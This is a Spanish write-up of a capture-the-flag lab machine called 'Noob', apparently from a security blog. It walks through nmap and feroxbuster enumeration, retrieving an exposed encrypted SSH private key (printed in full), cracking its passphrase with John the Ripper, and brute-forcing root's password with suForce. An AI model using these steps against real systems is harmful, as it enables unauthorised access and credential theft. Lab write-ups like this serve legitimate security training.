---
title: "[ES] Writeup de la Noob"
date: 2025-03-28T00:00:00+00:00
tags: ["hacking","spanish","cybersec","classnotes","writeups"]
author: "XoanOuteiro"
showToc: true
TocOpen: false
draft: false
description: "Writeup de la maquina Noob"
---

Arpsweep:

``` bash
sudo nmap -sn 192.168.56.100/24 -oN arpsweep.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 17:51 CET
Nmap scan report for 192.168.56.1
Host is up (0.00019s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.10
Host is up (0.0010s latency).
MAC Address: 08:00:27:FB:FB:0A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.109
Host is up (0.00072s latency).
MAC Address: 08:00:27:81:8F:71 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.100
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.25 seconds
```

La IP es 192.168.56.109

Vemos los puertos abiertos:

``` bash
sudo nmap -sS -p- -T4 192.168.56.109 -oN active_ports.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 17:52 CET
Nmap scan report for 192.168.56.109
Host is up (0.000096s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:81:8F:71 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.27 seconds
```

Y hacemos un escaneo de servicios:

``` bash
sudo nmap -sS -p 22,21,80 -A -T4 192.168.56.109 -oN 

service_detection.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 17:53 CET
Nmap scan report for 192.168.56.109
Host is up (0.00088s latency).

PORT   STATE  SERVICE VERSION
21/tcp closed ftp
22/tcp open   ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open   http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
MAC Address: 08:00:27:81:8F:71 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.88 ms 192.168.56.109

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.77 seconds
```

Enumeramos HTTP mediante un fuzzing basico:

``` bash
feroxbuster --url http://192.168.56.109 -x html -x pdf -x txt -x bak -x git

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.109
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, pdf, txt, bak, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       24l      126w    10355c http://192.168.56.109/icons/openlogo-75.png
200      GET      368l      933w    10701c http://192.168.56.109/
200      GET      368l      933w    10701c http://192.168.56.109/index.html
200      GET        9l       18w      101c http://192.168.56.109/notes.txt
[####################] - 21s   180030/180030  0s      found:4       errors:5      
[####################] - 21s   180000/180000  8602/s  http://192.168.56.109/                                                                                                     
```

Viendo notes.txt:

``` bash
curl http://192.168.56.109/notes.txt

Fuck!

configuring SSH, I closed the editor by mistake and lost the key.. I can't find it





Diego
```

Haciendo fuzzing podemos encontrar un archivo oculto:

``` bash
feroxbuster --url http://192.168.56.109 -w id_rsa.txt -x bak -x git -x zip -x pub -x tmp -x swap -x temp -x swp

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.109
 🚀  Threads               │ 50
 📖  Wordlist              │ id_rsa.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [bak, git, zip, pub, tmp, swap, temp, swp]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       24l      126w    10355c http://192.168.56.109/icons/openlogo-75.png
200      GET      368l      933w    10701c http://192.168.56.109/
200      GET       30l       37w     1743c http://192.168.56.109/id_rsa.swp
[####################] - 1s        63/63      0s      found:3       errors:0      
[####################] - 0s        18/18      113/s   http://192.168.56.109/ 
```

Donde id_rsa.txt tiene la linea "id_rsa" unicamente

Podemos ver la clave de diego:

``` bash
curl http://192.168.56.109/id_rsa.swp

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,5FB6DAB10833FB47

wyx0cnQnbD8irngLK6O52ClihBJPTKpjbQdqfB/AbIlyBCtm0AAib5Ej6VH9UMKy
FEFFemgiN2Wpxz3vPq6RI470BL+2BXbqhO3yNGwCkmHiStWQ8AlhXdh+z5cP8xoT
/3wTzXQsCMT2sCwvOs2QoKXTEzd8RF6SqjD2ambSkzZMCoo+dYHw4+2PnbUiXr3s
VSJsNxiouNu9uUT+MpvKyfvpW1jfE/lcyEYWHFhllIjyLYqmZDEumhfMu3Q2ji7c
XjAuzgapP11+uSnzFLQo8DrSdmhmYJV+xYpKBiQLAZcsiwTzuyYz0CQhpVa7z9P6
rob+yzlwG/7erGjDb6wg/UJwDcjPn+T9mPrU0fZDF13iJNG9sE0OG80hd6QwPiFJ
mlW++fLEtYTC+wv56QiGPlDZn4yDziABRnRxYjHJnPvxZjpZFq+1hMc6OEyIst02
fN/C0Q6oZtYdLleb15/jhlX1gKH70L8a8ecmgmmYaS31kMdHwZinU8wHl4Pcrf88
We71WkrkFkuPlF2afLDehYSlJxeT2cJ+H9lGkEsfGL4JtoT4uyjsREiqC0Q3BlsD
7fA4t4k7quxq9q6A5YJQc8pDKWO6f/poDTBHxeK4Urzwh4gMjLWxuImTpvG3mydp
Z8FdMgO/AyWa7Zq8DACEZoDxY6IWwwJ2vcaSremVBlA2vkQqZsG1Df2wDlfF+/P0
PMUNDDshRx92IHnzinM+AM3HilxDKV1vwjMjOJJH1blb1sNIHUT85P90Ewn5NEgE
ACl3fK/GkOU9KX0gGfkXwmWqrFkeliTEhGpi7s9j5YSvbq4fTszxqt8UuM/gdTUf
7GPJCOe/h3oudznytN6j2N6Z15SOGG2j8+xUfgAbW/+IxuCdpVqGWESkTJ7VfbxR
sKq3U1AUm+fLrQ6T9+NIzHRuqts9EXUMkXjoDIsY56ZYU04oOezuvDzgy/GxVNeC
eLDEo8/IY77HjoQxP3a+AfEyFH26x4JVgF43RXSqdyGL62IqAjmdNnRM91XZJUY7
nNsnTyYDmQaAZLY2KQfiYQkUV4q6sGVmcwzM+ryTAIQJlmYbo+OCKZgg4ZxOjofM
axd1DhxHbC/Y2CdkB60N9fJdQSKqYjGPK7dDI/JBevrphp+p6ZMDeP8oERryI8mX
aLdVMWV3VcvR6Vs/x2/ogI6EBn1CA2VOooTtV77zKRHDcDlU2HmiOSRNCXvwLDi0
qPLJRBwSE+wwMgDAKsU+Yv5itHq7pCkeqzMbvD6E5kFyvHhXi2YmYj4EYPiz8OYP
dyw7aG8b8tICRoYRN3FjFH5kh1/PXWOf1TlbdHmYE6vNgpoBmrNNfEzT6zeZxKXj
ExJHVZ3v9+7rhPXUZasONogZrm9w9fOPSMFrVdNZsrZsrWAukfG+wCKVdzy5vAvL
bHefHgEM5ZC8v4+Kg7nsFjM6DHWn5y+lFb15TYptWApZ7+2UWHGhu3a1lZvxSFGi
iwEjHBlsCo8IBsRIRKrae6RpuQhVlm1fRZqf0yFuv2W2KjUGMqCinxn/7o7rY/d3
l5Ziei4zwDkhZTWB+iZtaJ7aSUJ6CKJb5sTta7HqSSgutGAX80Ao3g==
-----END RSA PRIVATE KEY-----
```

Lo obtenemos:

``` bash
curl http://192.168.56.109/id_rsa.swp > id_rsa

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1743  100  1743    0     0   187k      0 --:--:-- --:--:-- --:--:--  212k
```

Intentamos iniciar sesion:

``` bash
chmod 700 id_rsa

ssh -i id_rsa diego@192.168.56.109

Enter passphrase for key 'id_rsa': 
```

Requerimos un passphrase, vamos a crackearlo:

``` bash
ssh2john id_rsa > id_rsa.hash

john --wordlis=/usr/share/wordlists/rockyou.txt id_rsa.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sandiego         (id_rsa)     
1g 0:00:00:00 DONE (2025-03-27 18:21) 10.00g/s 31680p/s 31680c/s 31680C/s billy1..heaven1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Probamos con la passphrase sandiego:

``` bash
ssh -i id_rsa diego@192.168.56.109

Enter passphrase for key 'id_rsa': 
Linux noob 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
Last login: Mon May 22 13:56:42 2023 from 192.168.1.10
diego@noob:~$ 
```

Y estamos dentro como Diego.

Pillamos la flag.

``` bash
diego@noob:~$ cat user.txt 
[user-flag]
```

Vamos a transferir LeanPEAS, en este caso con python HTTP server y wget en la victima.

LinPEAS no destaca nada demasiado como vector con mucha probabilidad de exito.

Aunque llama la atencion:

``` bash
╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

```

No tienen nada especialmente interesante.

Busquemos permisos SUID:

``` bash
diego@noob:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Como en LinPEAS. Vemos GTFOBins, no hay nada util.

En SGID tenemos:

``` bash
╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwxr-sr-x 1 root ssh 347K jul  2  2022 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 79K feb  7  2020 /usr/bin/chage
-rwxr-sr-x 1 root tty 35K ene 20  2022 /usr/bin/wall
-rwxr-sr-x 1 root crontab 43K feb 22  2021 /usr/bin/crontab
-rwxr-sr-x 1 root mail 23K feb  4  2021 /usr/bin/dotlockfile
-rwxr-sr-x 1 root tty 23K ene 20  2022 /usr/bin/write.ul (Unknown SGID binary)
-rwxr-sr-x 1 root shadow 31K feb  7  2020 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 38K ago 26  2021 /usr/sbin/unix_chkpwd

```


Podemos escribir en el fichero /var/www/html. Pruebo a subir una webshell pero el servidor no interpreta PHP.

La ultima opcion es probar a obtener la contraseña de root mediante su:

``` bash
su - root
```

Esto se puede automatizar, por ejemplo mediante suForce o su-bruteforce. Una vez descargados a kali transferimos los ficheros mediante wget a la maquina (en este caso subo suForce y rockyou.txt)

Y mediante:

``` bash
./suForce.sh -u root -w rockyou.txt 
```

Tras un rato descubrimos que la contraseña es rootbeer.

Y  podemos iniciar sesion como root.

``` bash
root@noob:~# cat root.txt 
[root-flag]
```
